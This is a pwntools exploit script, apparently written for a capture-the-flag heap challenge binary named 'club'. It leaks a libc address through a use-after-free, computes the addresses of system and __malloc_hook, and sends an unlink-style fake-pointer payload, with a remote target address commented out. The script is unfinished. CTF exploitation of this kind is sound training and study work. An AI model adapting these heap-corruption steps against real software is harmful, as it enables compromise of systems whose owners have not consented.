# -*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug' 

# p = remote("123.206.22.95", 8888)
p = process("./club")
elf = ELF("./club")
libc = ELF("libc.so.6")


raw_input()

def add_box(index, size, first = False):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("> ")
    p.sendline(str(index))
    if first:
    	p.recvuntil("> ")
    	p.sendline(str(size))
    

def delete_box(index):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("> ")
    p.sendline(str(index))

def edit_box(index, content):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("> ")
    p.sendline(str(index))
    p.sendline(content)

def show_box(index):
    p.recvuntil("> ")
    p.sendline("4")
    p.recvuntil("> ")
    p.sendline(str(index))

got_puts = elf.got["puts"]

add_box(2, 0x100, True)
add_box(3, 0x110, True)
delete_box(2)
show_box(2)
leak = u64(p.recv(6).ljust(8, "\x00"))
print "leak fd = " + hex(leak)
system_addr = leak - 3667944
print "system_addr = " + hex(system_addr)
malloc_hook = leak - 104
point = leak + 2792
# 0x00007feaf27fcf53
payload = p64(point-0x18) + p64(point-0x10)
edit_box(2, payload)

delete_box(3)

raw_input()
p.recvuntil("")
# p.interactive()
